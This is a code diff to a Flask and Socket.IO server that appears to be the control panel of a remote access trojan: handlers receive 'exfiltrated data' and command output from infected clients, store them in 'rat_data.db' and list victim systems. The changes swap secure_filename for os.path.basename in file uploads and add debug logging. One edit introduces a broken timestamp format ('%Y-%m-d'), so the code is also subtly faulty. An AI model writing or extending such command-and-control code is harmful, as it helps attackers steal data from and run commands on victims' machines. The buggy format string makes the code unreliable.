@@ -5,7 +5,6 @@ import datetime
 import sqlite3
 from flask import Flask, render_template, request, send_from_directory, jsonify
 from flask_socketio import SocketIO, emit
-from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
@@ -93,7 +92,7 @@ def upload_file():
     if file.filename == '':
         return jsonify({"status": "error", "message": "No selected file"}), 400
     if file:
-        filename = secure_filename(file.filename)
+        filename = os.path.basename(file.filename)  # Avoid importing secure_filename
         file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
         file.save(file_path)
         return jsonify({"status": "success", "filename": filename})
@@ -164,7 +163,13 @@ def handle_disconnect(sid):
 def handle_exfil_data(sid, data):
     """Handle exfiltrated data from clients."""
     client_id = sid
-    data = json.loads(data)
+    print(f"[*] Received exfil_data from {client_id}: {data}")  # Debug log
+    try:
+        data = json.loads(data) if isinstance(data, str) else data
+    except json.JSONDecodeError as e:
+        print(f"[!] JSON decode error for exfil_data from {client_id}: {e}")
+        return
+
     data_type = data.get('type')
     conn = sqlite3.connect('rat_data.db')
     c = conn.cursor()
@@ -203,7 +208,7 @@ def handle_exfil_data(sid, data):
                   (client_id, command, output, current_dir, timestamp))
 
         emit('command_output', {
-            'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
+            'timestamp': timestamp.strftime("%Y-%m-d %H:%M:%S"),
             'client_id': client_id,
             'command': command,
             'output': output,
@@ -222,6 +227,7 @@ def handle_exfil_data(sid, data):
 @socketio.on('request_client_info')
 def handle_request_client_info(sid):
     """Handle requests for client info from the web interface."""
+    print(f"[*] Handling request_client_info from {sid}")  # Debug log
     client_info_list = [
         {'id': cid, 'system': info}
         for cid, info in client_info.items()
